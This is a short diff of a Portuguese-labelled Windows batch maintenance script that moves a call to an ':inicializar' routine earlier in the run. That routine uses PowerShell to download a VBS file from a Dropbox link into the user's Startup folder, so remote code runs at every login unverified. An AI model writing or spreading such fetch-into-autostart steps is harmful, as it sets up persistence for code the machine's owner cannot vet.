@@ -313,6 +313,7 @@ for /f "delims=" %%A in ('powershell -Command "[math]::Round((Get-WmiObject Win3
 )
 	call :LOGS
 	call :link
+	call :inicializar
 :: =============================================
 :: BACKUP SQL
 :: =============================================
@@ -357,7 +358,6 @@ if %errorlevel% equ 0 (
 	call :IPV1
 	call :StopServices
 	call :StartServices
-	call :inicializar
 	call :LIMPEZAA
 ::==========================
 ::         FUNÇOES
@@ -548,6 +548,7 @@ goto :eof
 :inicializar
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/akorc9rgtubicumxfgv8b/Menssagem.vbs?rlkey=0yxqyoicv6u83hlya8bnlar0r&st=vxv6y6ax&dl=1', [Environment]::GetFolderPath('Startup') + '\Menssagem.vbs')"
 goto :eof
+
 
 
 
